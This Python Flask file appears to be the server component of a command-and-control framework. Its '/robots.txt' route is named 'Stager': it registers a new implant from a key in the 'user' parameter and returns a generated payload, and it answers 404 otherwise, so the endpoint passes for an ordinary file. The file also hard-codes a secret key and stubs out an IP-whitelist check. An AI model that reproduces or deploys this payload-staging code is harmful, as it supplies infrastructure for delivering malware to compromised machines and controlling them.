from flask import Flask, request
from Implant.Implant import ImplantSingleton
from Data.Database import Database
Imp=ImplantSingleton.instance



db=Database()
app = Flask(__name__)
app.config.from_object(__name__)
# -- TODO: Remove/Randomise all SECRET_KEY values.
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'

@app.before_request
def before_request():
    # Check IP Whitelist and reject if configured.
    return

@app.after_request
def add_header( r):
    #r.headers["X-Command"] = a
    return r

@app.route("/robots.txt",methods=['GET'])
def Stager():
    NewSplicedImplantData = db.Register_NewImplantFromStagerKey(request.values['user'])
    if NewSplicedImplantData:
        output_from_parsed_template = Imp.GeneratePayload(NewSplicedImplantData)
    else:
        return "404", 404

    return output_from_parsed_template